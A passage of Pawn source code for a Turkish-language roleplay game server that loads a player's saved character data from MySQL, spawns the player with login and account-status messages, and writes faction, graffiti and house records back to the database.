			Karakter[extraid][posy] = cache_get_field_content_float(0, "posy");
			Karakter[extraid][posz] = cache_get_field_content_float(0, "posz");
		    Karakter[extraid][interior] = cache_get_field_content_int(0, "interior");
	        Karakter[extraid][vworld] = cache_get_field_content_int(0, "vworld");
	        Karakter[extraid][level] = cache_get_field_content_int(0, "level");
	        Karakter[extraid][para] = cache_get_field_content_int(0, "para");
	        Karakter[extraid][skin] = cache_get_field_content_int(0, "skin");
	        Karakter[extraid][hp] = cache_get_field_content_float(0, "hp");
	        Karakter[extraid][armor] = cache_get_field_content_float(0, "armor");
	        Karakter[extraid][kimlikno] = cache_get_field_content_int(0, "kimlikno");
	        Karakter[extraid][yas] = cache_get_field_content_int(0, "yas");
	        Karakter[extraid][cinsiyet] = cache_get_field_content_int(0, "cinsiyet");
	        Karakter[extraid][uyruk] = cache_get_field_content_int(0, "uyruk");
	        Karakter[extraid][adminlevel] = cache_get_field_content_int(0, "adminlevel");
	        Karakter[extraid][kilit] = cache_get_field_content_int(0, "kilit");
	        Karakter[extraid][ck] = cache_get_field_content_int(0, "ck");
	        cache_get_field_content(0, "neden", Karakter[extraid][neden], g_iHandle, 24);
	        Karakter[extraid][chatstili] = cache_get_field_content_int(0, "chatstili");
	        Karakter[extraid][uesrar] = cache_get_field_content_int(0, "esrar");
	        Karakter[extraid][umantar] = cache_get_field_content_int(0, "mantar");
	        Karakter[extraid][hammantar] = cache_get_field_content_int(0, "hammantar");
	        Karakter[extraid][usaksi] = cache_get_field_content_int(0, "usaksi");
	        Karakter[extraid][esrartohum] = cache_get_field_content_int(0, "esrartohum");
	        Karakter[extraid][birlik] = cache_get_field_content_int(0, "birlik");
	        Karakter[extraid][rutbe] = cache_get_field_content_int(0, "rutbe");
	        Karakter[extraid][kodes] = cache_get_field_content_int(0, "kodes");
	        Karakter[extraid][ajail] = cache_get_field_content_int(0, "ajail");
	        Karakter[extraid][ceza] = cache_get_field_content_int(0, "ceza");
	        cache_get_field_content(0, "cezaneden", Karakter[extraid][cezaneden], g_iHandle, 24);
	        Karakter[extraid][amfetamin] = cache_get_field_content_int(0, "amfetamin");
	        Karakter[extraid][metamfetamin] = cache_get_field_content_int(0, "metamfetamin");
	        Karakter[extraid][lsd] = cache_get_field_content_int(0, "lsd");
	        Karakter[extraid][extacy] = cache_get_field_content_int(0, "extacy");
	        Karakter[extraid][eroin] = cache_get_field_content_int(0, "eroin");
	        Karakter[extraid][kokain] = cache_get_field_content_int(0, "kokain");
	        Karakter[extraid][morfin] = cache_get_field_content_int(0, "morfin");
	        Karakter[extraid][MDA] = cache_get_field_content_int(0, "MDA");
	        cache_get_field_content(0, "ip", Karakter[extraid][aip], g_iHandle, 24);
	        Karakter[extraid][telno] = cache_get_field_content_int(0, "telno");
	        Karakter[extraid][isbasi] = cache_get_field_content_int(0, "isbasi");
	        Karakter[extraid][isbasiskin] = cache_get_field_content_int(0, "isbasiskin");
	        Karakter[extraid][exp] = cache_get_field_content_int(0, "exp");
	        Karakter[extraid][hesapno] = cache_get_field_content_int(0, "hesapno");
	        Karakter[extraid][banka] = cache_get_field_content_int(0, "banka");
	        Karakter[extraid][savings] = cache_get_field_content_int(0, "savings");
	        Karakter[extraid][payday] = cache_get_field_content_int(0, "paydakika");
	        Karakter[extraid][maske] = cache_get_field_content_int(0, "maske");
	        Karakter[extraid][maskeno] = cache_get_field_content_int(0, "maskeno");
	        Karakter[extraid][meslek] = cache_get_field_content_int(0, "meslek");
	        Karakter[extraid][balik] = cache_get_field_content_int(0, "balik");
	        Karakter[extraid][yem] = cache_get_field_content_int(0, "yem");
	        Karakter[extraid][olta] = cache_get_field_content_int(0, "olta");
	        Karakter[extraid][tester] = cache_get_field_content_int(0, "tester");
	        Karakter[extraid][sigara] = cache_get_field_content_int(0, "sigara");
	        Karakter[extraid][sonx] = cache_get_field_content_float(0, "sonx");
	        Karakter[extraid][sony] = cache_get_field_content_float(0, "sony");
	        Karakter[extraid][sonz] = cache_get_field_content_float(0, "sonz");
	        Karakter[extraid][sonvw] = cache_get_field_content_int(0, "sonvw");
	        Karakter[extraid][sonint] = cache_get_field_content_int(0, "sonint");
	        Karakter[extraid][bagimlimi] = cache_get_field_content_int(0, "bagimlimi");
	        Karakter[extraid][krizgeldimi] = cache_get_field_content_int(0, "krizgeldimi");
	        Karakter[extraid][utedavidurum] = cache_get_field_content_int(0, "utedavidurum");
	        Karakter[extraid][aclik] = cache_get_field_content_int(0, "aclik");
	        Karakter[extraid][susuzluk] = cache_get_field_content_int(0, "susuzluk");
	        Karakter[extraid][tuvalet] = cache_get_field_content_int(0, "tuvalet");

	        cache_get_field_content(0, "anick", Karakter[extraid][anick], g_iHandle, 24);
	        Karakter[extraid][askin] = cache_get_field_content_int(0, "askin");
	        Karakter[extraid][ehliyet] = cache_get_field_content_int(0, "ehliyet");
	        Karakter[extraid][kasseviye] = cache_get_field_content_int(0, "kasseviye");
	        Karakter[extraid][kaspuan] = cache_get_field_content_int(0, "kaspuan");
	        Karakter[extraid][grup] = cache_get_field_content_int(0, "grup");
	        Karakter[extraid][pGPS] = cache_get_field_content_int(0, "gps");
	        Karakter[extraid][box] = cache_get_field_content_int(0, "box");
	        Karakter[extraid][kungfu] = cache_get_field_content_int(0, "kungfu");
			Karakter[extraid][kneehead] = cache_get_field_content_int(0, "kneehead");
			Karakter[extraid][grabkick] = cache_get_field_content_int(0, "grabkick");
			Karakter[extraid][elbow] = cache_get_field_content_int(0, "elbow");
			Karakter[extraid][dovusure] = cache_get_field_content_int(0, "dovussure");
			Karakter[extraid][matA] = cache_get_field_content_int(0, "matA");
			Karakter[extraid][matB] = cache_get_field_content_int(0, "matB");
			Karakter[extraid][matC] = cache_get_field_content_int(0, "matC");
			Karakter[extraid][matD] = cache_get_field_content_int(0, "matD");
			Karakter[extraid][matE] = cache_get_field_content_int(0, "matE");
			Karakter[extraid][kokaintohum] = cache_get_field_content_int(0, "kokaintohum");
			Karakter[extraid][erointohum] = cache_get_field_content_int(0, "erointohum");
			cache_get_field_content(0, "kiyafetler", Karakter[extraid][kiyafetler], g_iHandle, 64);
			Karakter[extraid][benzinbidon] = cache_get_field_content_float(0, "benzinbidon");
			Karakter[extraid][bidon] = cache_get_field_content_int(0, "bidon");
			cache_get_field_content(0, "Nickname", Karakter[extraid][nick], g_iHandle, 32);
			Karakter[extraid][tezgah] = cache_get_field_content_int(0, "tezgah");
			Karakter[extraid][yemmiktar][1] = cache_get_field_content_int(0, "yem1");
			Karakter[extraid][yemmiktar][2] = cache_get_field_content_int(0, "yem2");
			Karakter[extraid][yemmiktar][3] = cache_get_field_content_int(0, "yem3");
			Karakter[extraid][medisbasi] = cache_get_field_content_int(0, "medisbasi");
			Karakter[extraid][fdisbasi] = cache_get_field_content_int(0, "fdisbasi");
			Karakter[extraid][sisbasi] = cache_get_field_content_int(0, "sisbasi");
			Karakter[extraid][dil] = cache_get_field_content_int(0, "dil");
			Karakter[extraid][unlu] = cache_get_field_content_int(0, "unlu");
			Karakter[extraid][rozetno] = cache_get_field_content_int(0, "rozetno");
			Karakter[extraid][ehliyetno] = cache_get_field_content_int(0, "ehliyetno");
			Karakter[extraid][alm] = cache_get_field_content_int(0, "alm");
			Karakter[extraid][arp] = cache_get_field_content_int(0, "arp");
			Karakter[extraid][cin] = cache_get_field_content_int(0, "cin");
			Karakter[extraid][isp] = cache_get_field_content_int(0, "isp");
			Karakter[extraid][ita] = cache_get_field_content_int(0, "ita");
			Karakter[extraid][japon] = cache_get_field_content_int(0, "japon");
			Karakter[extraid][fra] = cache_get_field_content_int(0, "fra");
			Karakter[extraid][rus] = cache_get_field_content_int(0, "rus");
			Karakter[extraid][ermen] = cache_get_field_content_int(0, "ermen");
			Karakter[extraid][ibra] = cache_get_field_content_int(0, "ibra");
			Karakter[extraid][yunan] = cache_get_field_content_int(0, "yunan");
			Karakter[extraid][slovak] = cache_get_field_content_int(0, "slovak");
			Karakter[extraid][irlan] = cache_get_field_content_int(0, "irlan");
			Karakter[extraid][porte] = cache_get_field_content_int(0, "porte");
			Karakter[extraid][sirp] = cache_get_field_content_int(0, "sirp");
			Karakter[extraid][arnavut] = cache_get_field_content_int(0, "arnavut");
			Karakter[extraid][sruhsat] = cache_get_field_content_int(0, "sruhsat");
			Karakter[extraid][sruhsat2] = cache_get_field_content_int(0, "sruhsat2");
			Karakter[extraid][soygunsure] = cache_get_field_content_int(0, "soygunsure");
			Karakter[extraid][kanama] = cache_get_field_content_int(0, "kanama");
			Karakter[extraid][telsiz] = cache_get_field_content_int(0, "telsiz");
			Karakter[extraid][frekans] = cache_get_field_content_int(0, "frekans");
			Karakter[extraid][galeri] = cache_get_field_content_int(0, "galeri");
			Karakter[extraid][ssgaleri] = cache_get_field_content_int(0, "ssgaleri");
			Karakter[extraid][gengelle] = cache_get_field_content_int(0, "gengelle");
			Karakter[extraid][gozrenk] = cache_get_field_content_int(0, "gozrenk");
			Karakter[extraid][sacrenk] = cache_get_field_content_int(0, "sacrenk");
			Karakter[extraid][boy] = cache_get_field_content_int(0, "boy");
			Karakter[extraid][kilo] = cache_get_field_content_int(0, "kilo");
			Karakter[extraid][bot] = cache_get_field_content_int(0, "bot");
			Karakter[extraid][ciu] = cache_get_field_content_int(0, "ciu");
            Karakter[extraid][kassure] = cache_get_field_content_int(0, "kassure");
            Karakter[extraid][uyari] = cache_get_field_content_int(0, "uyari");
            Karakter[extraid][saglikrapor] = cache_get_field_content_int(0, "saglikrapor");
            Karakter[extraid][temizrapor] = cache_get_field_content_int(0, "temizrapor");
            Karakter[extraid][surucusinav] = cache_get_field_content_int(0, "surucusinav");
            Karakter[extraid][bmxizin] = cache_get_field_content_int(0, "bmxizin");
            Karakter[extraid][pmizin] = cache_get_field_content_int(0, "pmizin");
            Karakter[extraid][notdefteri] = cache_get_field_content_int(0, "notdefteri");
            Karakter[extraid][oyunsure] = cache_get_field_content_int(0, "oyunsure");
            Karakter[extraid][oydurum] = cache_get_field_content_int(0, "oydurum");
            Karakter[extraid][deaglealdi] = cache_get_field_content_int(0, "deaglealdi");
            Karakter[extraid][pistolaldi] = cache_get_field_content_int(0, "pistolaldi");
            new mstring[32];
            cache_get_field_content(0, "bitcoin", mstring, g_iHandle, 32);
            Karakter[extraid][bitcoin] = floatstr(mstring);
			if(cache_get_field_content_int(0, "garajda")){
				gGarajGirdi[extraid] = true;
			}
			else {
				gGarajGirdi[extraid] = false;
			}
			Karakter[extraid][SilahSkin][5] = cache_get_field_content_int(0, "skin5");
            Karakter[extraid][SilahSkin][22] = cache_get_field_content_int(0, "skin22");
            Karakter[extraid][SilahSkin][24] = cache_get_field_content_int(0, "skin24");
            Karakter[extraid][SilahSkin][28] = cache_get_field_content_int(0, "skin28");
            Karakter[extraid][SilahSkin][29] = cache_get_field_content_int(0, "skin29");
            Karakter[extraid][SilahSkin][30] = cache_get_field_content_int(0, "skin30");
            Karakter[extraid][SilahSkin][31] = cache_get_field_content_int(0, "skin31");
            Karakter[extraid][SilahSkin][32] = cache_get_field_content_int(0, "skin32");
            Karakter[extraid][ozellik] = cache_get_field_content_int(0, "ozellik");
            KarakterOzellik[extraid][Liderlik] = cache_get_field_content_int(0, "liderlik");
            KarakterOzellik[extraid][Guc] = cache_get_field_content_int(0, "guc");
            KarakterOzellik[extraid][Pazarlik] = cache_get_field_content_int(0, "pazarlik");
            KarakterOzellik[extraid][Ustalik] = cache_get_field_content_int(0, "ustalik");
            Karakter[extraid][silahpayday] = cache_get_field_content_int(0, "silahpayday");
            Karakter[extraid][silahuretimid] = cache_get_field_content_int(0, "silahuretimid");
            Karakter[extraid][avukat] = cache_get_field_content_int(0, "avukat");
            Karakter[extraid][denizlisans] = cache_get_field_content_int(0, "denizlisans");
            Karakter[extraid][havalisans] = cache_get_field_content_int(0, "havalisans");
			KarakterYukle(extraid);
		}
	    case 2:
	    {
	        new sid;
	        for(new i, j = cache_get_row_count(g_iHandle); i < j; i++)
	        {
                sid = cache_get_row_int(i, 1, g_iHandle);
                if(!IsValidWeaponID(sid)) continue;
                Karakter[extraid][SilahM][sid] = cache_get_row_int(i, 2, g_iHandle);
                Karakter[extraid][MermiM][sid] = cache_get_row_int(i, 3, g_iHandle);
	        }
	    }
	    case 3:
	    {
	        new aracid;
	        for(new i, j = cache_get_row_count(g_iHandle); i < j; i++)
	        {
				aracid = cache_get_row_int(i, 1, g_iHandle);
				for(new vid;vid<MAX_VEHICLES;vid++)
				{
				    if(Arac[vid][aid] == aracid)
				        Karakter[extraid][aanahtar][vid] = 1;
				}
			}
	    }
	    case 4:
	    {
	        new evid;
	        for(new i, j = cache_get_row_count(g_iHandle); i < j; i++)
	        {
				evid = cache_get_row_int(i, 1, g_iHandle);
				Karakter[extraid][eanahtar][evid] = 1;
			}
	    }
	    case 5:
	    {
	        cache_get_data(rows, fields, g_iHandle);
			AUyusturucu[extraid][esrar] = cache_get_field_content_int(0, "esrar");
			Kutular[extraid] += AUyusturucu[extraid][esrar];
			AUyusturucu[extraid][amfetamin] = cache_get_field_content_int(0, "amfetamin");
			Kutular[extraid] += AUyusturucu[extraid][amfetamin];
			AUyusturucu[extraid][metamfetamin] = cache_get_field_content_int(0, "metamfetamin");
			Kutular[extraid] += AUyusturucu[extraid][metamfetamin];
			AUyusturucu[extraid][lsd] = cache_get_field_content_int(0, "lsd");
			Kutular[extraid] += AUyusturucu[extraid][lsd];
			AUyusturucu[extraid][extacy] = cache_get_field_content_int(0, "extacy");
			Kutular[extraid] += AUyusturucu[extraid][extacy];
			AUyusturucu[extraid][kokain] = cache_get_field_content_int(0, "kokain");
			Kutular[extraid] += AUyusturucu[extraid][kokain];
			AUyusturucu[extraid][eroin] = cache_get_field_content_int(0, "eroin");
			Kutular[extraid] += AUyusturucu[extraid][eroin];
			AUyusturucu[extraid][morfin] = cache_get_field_content_int(0, "morfin");
			Kutular[extraid] += AUyusturucu[extraid][morfin];
			AUyusturucu[extraid][MDA] = cache_get_field_content_int(0, "MDA");
			Kutular[extraid] += AUyusturucu[extraid][MDA];
	    }
	}
	return 1;
}

KarakterYukle(playerid)
{
    TogglePlayerSpectating(playerid, 0);
    SetCameraBehindPlayer(playerid);
    Girdi[playerid] = true;
	if((Karakter[playerid][posx] == 0 && Karakter[playerid][posy] == 0) || (Karakter[playerid][posx] == 50 && Karakter[playerid][posy] == 50)) {
		Karakter[playerid][posx] = 1529.6;
		Karakter[playerid][posy] = -1691.2; 
		Karakter[playerid][posz] = 13.3;
		Karakter[playerid][interior] = 0;
		Karakter[playerid][vworld] = 0;
	}
	SetSpawnInfo(playerid, 0,Karakter[playerid][skin], Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz],0,0,0,0,0,0,0);
	if(Debug) printf("SetSpawnInfo(%d, 0,%d, %f, %f, %f,0,0,0,0,0,0,0);",playerid,Karakter[playerid][skin],Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
	SpawnPlayer(playerid);

	if(Karakter[playerid][adminlevel] >= 1) AdminDuyma[playerid] = 1;

	KillTimerEx(TimerGirisKontrol[playerid]);
	SetPlayerColor(playerid,COLOR_WHITE);
	HideMainScreen(playerid);
	//TextDrawHideForPlayer(playerid, Login[1]);
	//TextDrawHideForPlayer(playerid, Login[2]);
	//TextDrawHideForPlayer(playerid, Login[3]);
	//TextDrawHideForPlayer(playerid, Login[4]);
 	if(Karakter[playerid][kanama] > 0) {
 		SagAltGoster(playerid, 2);
 	}
 	else {
 		SagAltGoster(playerid, 1);
 	}
	static mmstring[32];
	format(mmstring, sizeof(mmstring), "~w~%08d", Karakter[playerid][para]);
 	PlayerTextDrawSetString(playerid, ParaTD[playerid], mmstring);
	//PlayerTextDrawShow(playerid, ParaTD[playerid]);
	GirdiYarat(playerid);
	DONDUR(playerid);
    TogglePlayerSpectating(playerid, false);

	SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
  	if(Karakter[playerid][adminlevel] >= 4) UnfreezeTimerVar[playerid] = SetTimerEx("UnfreezeTimer", 4000, false, "i", playerid);
	SetPlayerInteriorEx(playerid, Karakter[playerid][interior]);
	SetPlayerVirtualWorld(playerid, Karakter[playerid][vworld]);
	SetPlayerScore(playerid, Karakter[playerid][level]);
	SetPlayerCash(playerid, Karakter[playerid][para]);
	SetPlayerHealth(playerid, Karakter[playerid][hp]);
	SetPlayerArmour(playerid, Karakter[playerid][armor]);

	new plname[MAX_PLAYER_NAME];
	GetPlayerName(playerid,plname,sizeof(plname));
	/*if(Karakter[playerid][skin] != -1)
	{
		SetPlayerSkin(playerid, Karakter[playerid][skin]);
	}
	else
	{
		if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, egirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, egirissiyah, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kgirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kgirissiyah, "Kiyafet Secimi");
	}*/
	//EnvanterYukle(playerid);
	RehberYukle(playerid);
	AksesuarYukle(playerid);

	AllahinYokmu(playerid);
	if(Karakter[playerid][adminlevel] > 0){ new selamverabime[128]; format(selamverabime, sizeof(selamverabime), "%d seviye yönetici olarak giriþ yaptýnýz.", Karakter[playerid][adminlevel]); SendClientMessage(playerid, -1, selamverabime); }
	Bilgi(playerid, "Sunucuya baþarýyla giriþ yaptýnýz, iyi eðlenceler dileriz.");
	StopAudioStreamForPlayer(playerid);
	if(Karakter[playerid][ceza] >= 1)
	{
	    SendClientMessage(playerid, 0xE84D4DAA, "Ödenmemiþ cezanýz bulunmaktadýr. ({FFFFFF}/cezalarim{E84D4D})");
	    Ipucu(playerid, "Cezanýzý Los Santos Polis Departmaný lobisinde ödeyebilirsiniz.");
	}
	if(Karakter[playerid][krizgeldimi] == 1)
	{
	    if(Karakter[playerid][bagimlimi] >= 15)
	    {
	        CheckCrisis(playerid, 1);
	    }
	    else if(Karakter[playerid][bagimlimi] >= 25)
	    {
	        CheckCrisis(playerid, 2);
	    }
	    else if(Karakter[playerid][bagimlimi] >= 35)
	    {
			CheckCrisis(playerid, 3);
	    }
	}
	/*if(!Evlerim(playerid))
	{
	    Bilgi(playerid, "Sokakta yaþadýðýnýz için saðlýðýnýz düþük durumda.");
	    SetPlayerHealth(playerid, 50.0);
	}*/
 	if(Karakter[playerid][ck] == 1)
 	{
 	    TogglePlayerControllable(playerid,0);
 	    ClearScreen(playerid);
 	    ShowMainScreen(playerid);
		SetPlayerPos(playerid, 2092.5251,-1834.8268,10.6937);
		SetPlayerCameraPos(playerid, 2036.2668,-1688.4971,73.8019);
		SetPlayerCameraLookAt(playerid, 2050.1069,-1703.2759,60.8849);
		SendClientMessage(playerid,0xE84D4DAA,"[Karakter Ölü]");
 	    SendClientMessage(playerid,0xE84D4DAA,"Hesabýnýza eriþim sistem tarafýndan engellendi.");
 	    SendClientMessage(playerid,0xE84D4DAA,"Bunun nedeni karakter ölümünüzün gerçekleþmiþ olmasý.");
 	    SendClientMessage(playerid,0xE84D4DAA,"Yeni bir karakter açmak istiyorsanýz;");
 	    SendClientMessage(playerid,0xE84D4DAA,"Ticket üzerinden karakterinizi yasaklatarak yeni karakter oluþturabilir veya");
 	    SendClientMessage(playerid,0xE84D4DAA,"marketten isim deðiþikliði gerçekleþtirebilirsiniz.");
		SendClientMessage(playerid,0xE84D4DAA,"[www.eightbornrpg.com/forum]");
 	    KickEx(playerid);
	}
	if(Karakter[playerid][kilit] == 1)
 	{
 	    TogglePlayerControllable(playerid,0);
 	    ClearScreen(playerid);
 	    ShowMainScreen(playerid);
		SetPlayerPos(playerid, 2092.5251,-1834.8268,10.6937);
		SetPlayerCameraPos(playerid, 2036.2668,-1688.4971,73.8019);
		SetPlayerCameraLookAt(playerid, 2050.1069,-1703.2759,60.8849);
		SendClientMessage(playerid,0xE84D4DAA,"[Kilitli Hesap]");
 	    SendClientMessage(playerid,0xE84D4DAA,"Hesabýnýza eriþim sistem tarafýndan engellendi.");
 	    SendClientMessage(playerid,0xE84D4DAA,"Bunun nedeni hile yapmanýz veya hatalý yasaklanma olabilir.");
 	    SendClientMessage(playerid,0xE84D4DAA,"Bilgi için lütfen websitemizi ziyaret ediniz.");
		SendClientMessage(playerid,0xE84D4DAA,"[www.eightbornrpg.com/forum]");
 	    KickEx(playerid);
	}
	meetTextUpdate(playerid);
	for(new i=0; i < 47; i++)
	{
		if(!IsValidWeaponID(i)) continue;
		Karakter[playerid][SilahM][i] = 0;
		Karakter[playerid][MermiM][i] = 0;
	}
 	new mquery[1024];
	format(mquery, sizeof(mquery), "SELECT * FROM `aracanahtar` WHERE `oyuncuID` = '%d'", Karakter[playerid][sqlid]);
	mysql_function_query(g_iHandle, mquery, true, "OnQueryFinished", "dd", playerid, 3);
	format(mquery, sizeof(mquery), "SELECT * FROM `evanahtar` WHERE `oyuncuID` = '%d'", Karakter[playerid][sqlid]);
	mysql_function_query(g_iHandle, mquery, true, "OnQueryFinished", "dd", playerid, 4);
	SetCameraBehindPlayer(playerid);
	Karakter[playerid][teldurum] = 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == FBI) PDTextDrawYukle(playerid);
    //OyuncuSilahGuncelle(playerid);
    COZ(playerid);
	CancelSelectTextDraw(playerid);
	for(new i = 0; i < sizeof(AltKarakter_TD); i++) {
		TextDrawHideForPlayer(playerid, AltKarakter_TD[i]);
	}

	for(new i = 0; i < sizeof(AltKarakter_PTD[]); i++) {
		switch(i) {
			case 16,18,19: continue;
			default: PlayerTextDrawHide(playerid, AltKarakter_PTD[playerid][i]);
		}
	}
}
stock BirlikKaydet(birlikid)
{
	new mquery[4096];

 	new fisimx[54];
 	format(fisimx,54,"%s",EscapeString(Birlik[birlikid][fisim]));
 	new fisimxx[20][54];
  	format(fisimxx[0],54,"%s",EscapeString(Birlik[birlikid][rutbe1]));
  	format(fisimxx[1],54,"%s",EscapeString(Birlik[birlikid][rutbe2]));
  	format(fisimxx[2],54,"%s",EscapeString(Birlik[birlikid][rutbe3]));
  	format(fisimxx[3],54,"%s",EscapeString(Birlik[birlikid][rutbe4]));
  	format(fisimxx[4],54,"%s",EscapeString(Birlik[birlikid][rutbe5]));
  	format(fisimxx[5],54,"%s",EscapeString(Birlik[birlikid][rutbe6]));
  	format(fisimxx[6],54,"%s",EscapeString(Birlik[birlikid][rutbe7]));
  	format(fisimxx[7],54,"%s",EscapeString(Birlik[birlikid][rutbe8]));
  	format(fisimxx[8],54,"%s",EscapeString(Birlik[birlikid][rutbe9]));
  	format(fisimxx[9],54,"%s",EscapeString(Birlik[birlikid][rutbe10]));
  	format(fisimxx[10],54,"%s",EscapeString(Birlik[birlikid][rutbe11]));
  	format(fisimxx[11],54,"%s",EscapeString(Birlik[birlikid][rutbe12]));
  	format(fisimxx[12],54,"%s",EscapeString(Birlik[birlikid][rutbe13]));
  	format(fisimxx[13],54,"%s",EscapeString(Birlik[birlikid][rutbe14]));
  	format(fisimxx[14],54,"%s",EscapeString(Birlik[birlikid][rutbe15]));
  	format(fisimxx[15],54,"%s",EscapeString(Birlik[birlikid][rutbe16]));
  	format(fisimxx[16],54,"%s",EscapeString(Birlik[birlikid][rutbe17]));
  	format(fisimxx[17],54,"%s",EscapeString(Birlik[birlikid][rutbe18]));
  	format(fisimxx[18],54,"%s",EscapeString(Birlik[birlikid][rutbe19]));
  	format(fisimxx[19],54,"%s",EscapeString(Birlik[birlikid][rutbe20]));

	format(mquery, sizeof(mquery), "UPDATE `birlikler` SET `fisim` = '%s', `rutbe1` = '%s', `rutbe2` = '%s', `rutbe3` = '%s', `rutbe4` = '%s', `rutbe5` = '%s', `rutbe6` = '%s', `rutbe7` = '%s', `rutbe8` = '%s', `rutbe9` = '%s', `rutbe10` = '%s', `rutbe11` = '%s', `rutbe12` = '%s' WHERE `sqlid` = '%d'",
	fisimx,
	fisimxx[0],
	fisimxx[1],
	fisimxx[2],
	fisimxx[3],
	fisimxx[4],
	fisimxx[5],
	fisimxx[6],
	fisimxx[7],
	fisimxx[8],
	fisimxx[9],
	fisimxx[10],
	fisimxx[11],
	Birlik[birlikid][sqlid]);
	mysql_tquery(1, mquery);

	format(mquery, sizeof(mquery), "UPDATE `birlikler` SET `rutbe13` = '%s', `rutbe14` = '%s', `rutbe15` = '%s', `rutbe16` = '%s', `rutbe17` = '%s', `rutbe18` = '%s', `rutbe19` = '%s', `rutbe20` = '%s' WHERE `sqlid` = '%d'",
	fisimxx[12],
	fisimxx[13],
	fisimxx[14],
	fisimxx[15],
	fisimxx[16],
	fisimxx[17],
	fisimxx[18],
	fisimxx[19],
	Birlik[birlikid][sqlid]);
	mysql_tquery(1, mquery);

	format(mquery, sizeof(mquery), "UPDATE `birlikler` SET `rutbe13maas` = '%d', `rutbe14maas` = '%d', `rutbe15maas` = '%d', `rutbe16maas` = '%d', `rutbe17maas` = '%d', `rutbe18maas` = '%d', `rutbe19maas` = '%d', `rutbe20maas` = '%d' WHERE `sqlid` = '%d'",
	Birlik[birlikid][rutbe13maas],
	Birlik[birlikid][rutbe14maas],
	Birlik[birlikid][rutbe15maas],
	Birlik[birlikid][rutbe16maas],
	Birlik[birlikid][rutbe17maas],
	Birlik[birlikid][rutbe18maas],
	Birlik[birlikid][rutbe19maas],
	Birlik[birlikid][rutbe20maas],
	Birlik[birlikid][sqlid]);
    mysql_tquery(1, mquery);

	format(mquery, sizeof(mquery), "UPDATE `birlikler` SET `itibar` = '%d', `lider` = '%d', `onay` = '%d', `seviye` = '%d', `ftip` = '%d', `rutbe1maas` = '%d', `rutbe2maas` = '%d', `rutbe3maas` = '%d', `rutbe4maas` = '%d', `rutbe5maas` = '%d', `rutbe6maas` = '%d', `rutbe7maas` = '%d', `rutbe8maas` = '%d', `rutbe9maas` = '%d', `rutbe10maas` = '%d', `rutbe11maas` = '%d', `rutbe12maas` = '%d' WHERE `sqlid` = '%d'",
    Birlik[birlikid][itibar],
    Birlik[birlikid][blider],
    Birlik[birlikid][onay],
	Birlik[birlikid][seviye],
	Birlik[birlikid][ftip],
	Birlik[birlikid][rutbe1maas],
	Birlik[birlikid][rutbe2maas],
	Birlik[birlikid][rutbe3maas],
	Birlik[birlikid][rutbe4maas],
	Birlik[birlikid][rutbe5maas],
	Birlik[birlikid][rutbe6maas],
	Birlik[birlikid][rutbe7maas],
	Birlik[birlikid][rutbe8maas],
	Birlik[birlikid][rutbe9maas],
	Birlik[birlikid][rutbe10maas],
	Birlik[birlikid][rutbe11maas],
	Birlik[birlikid][rutbe12maas],
	Birlik[birlikid][sqlid]);
	mysql_tquery(1, mquery);
	new mstring[255],nstring[255];
	format(mstring, sizeof(mstring), "%f|%f|%f|%d|%d", Birlik[birlikid][bisbasix], Birlik[birlikid][bisbasiy], Birlik[birlikid][bisbasiz], Birlik[birlikid][bisbasivw], Birlik[birlikid][bisbasiint]);
	format(nstring, sizeof(nstring), "%f|%f|%f|%d|%d", Birlik[birlikid][breklamx], Birlik[birlikid][breklamy], Birlik[birlikid][breklamz], Birlik[birlikid][breklamvw], Birlik[birlikid][breklamint]);
	format(mquery, sizeof(mquery), "UPDATE `birlikler` SET `isbasipos` = '%s', `reklampos` = '%s', `hesapno` = '%d', `reklamfiyat` = '%d', `kasa` = '%d' WHERE `sqlid` = '%d'",
	mstring,
	nstring,
	Birlik[birlikid][hesapno],
	Birlik[birlikid][rfiyat],
	Birlik[birlikid][kasa],
	Birlik[birlikid][sqlid]);
	mysql_tquery(1, mquery);
}
GraffitiKaydet(graffitix)
{
	new query[1024],_string[130];
	format(_string,130,"%s",EscapeString(Graffitiler[graffitix][gYazi]));
	format(query, sizeof(query), "UPDATE `graffitiler` SET `gYapan` = '%d', `gRenk` = '%d', `gInt` = '%d', `gVW` = '%d', `gYazi` = '%s', `gFont` = '%s', `Ortala` = '%d' WHERE GraffitiID = '%d'",Graffitiler[graffitix][gYapan],Graffitiler[graffitix][gRenk],Graffitiler[graffitix][gInt],Graffitiler[graffitix][gVW],_string,Graffitiler[graffitix][gFont],Graffitiler[graffitix][Ortala],graffitix);
	mysql_tquery(1, query);
	format(query, sizeof(query), "UPDATE `graffitiler` SET `gX` = '%f', `gY` = '%f', `gZ` = '%f',`gRX` = '%f',`gRY` = '%f',`gRZ` = '%f', `FontBoyut` = '%d', `MateryalBoyut` = '%d', `FontBold2` = '%d' WHERE GraffitiID = '%d'",Graffitiler[graffitix][gPos][0],Graffitiler[graffitix][gPos][1],Graffitiler[graffitix][gPos][2],
	Graffitiler[graffitix][gRot][0],Graffitiler[graffitix][gRot][1],Graffitiler[graffitix][gRot][2],Graffitiler[graffitix][FontBoyut],Graffitiler[graffitix][MateryalBoyut],Graffitiler[graffitix][FontBold2],graffitix);
	mysql_tquery(1, query);
}
stock EvKaydet(evid)
{
	new query[400];
	mysql_format(1, query, sizeof(query), "UPDATE `evler` SET `ekonum` = '%s', `esahip` = '%d', `girisx` = '%f', `girisy` = '%f', `girisz` = '%f', `egirisvw` = '%d', `egirisint` = '%d', `egirisangle` = '%f', `cikisx` = '%f', `cikisy` ='%f', `cikisz` = '%f', `ecikisint` = '%d', `ecikisvw` = '%d', `ecikisangle` = '%d', `efiyat` = '%d', `ekilit` = '%d' WHERE `sqlid` = '%d'",
	Ev[evid][ekonum],
